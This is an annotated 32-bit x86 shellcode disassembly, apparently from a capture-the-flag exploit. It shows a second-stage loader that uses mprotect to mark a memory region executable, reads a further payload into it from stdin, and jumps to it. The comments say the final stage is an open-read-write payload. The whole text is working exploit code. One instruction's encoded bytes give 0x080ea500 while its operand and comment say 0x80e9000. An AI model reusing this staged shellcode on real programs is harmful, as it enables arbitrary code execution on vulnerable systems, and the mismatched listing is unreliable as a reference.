0:  b0 7d                   mov    al,0x7d
2:  bb 00 a5 0e 08          mov    ebx,0x80e9000
7:  b9 00 10 00 00          mov    ecx,0x1000
c:  6a 07                   push   0x7
e:  5a                      pop    edx
f:  cd 80                   int    0x80              ; set 0x80e9000 have rwx protection
11: 6a 03                   push   0x3
13: 58                      pop    eax
14: 31 db                   xor    ebx,ebx
16: b9 00 a5 0e 08          mov    ecx,0x80e9000
1b: 6a 60                   push   0x60
1d: 5a                      pop    edx
1e: cd 80                   int    0x80              ; read to bss 
20: ff d1                   call   ecx               ; execute the third shellcode

# the first shellcode: on payload
# the second shellcode: this shellcode (mprotect, read)
# the third shellcode: open_read_write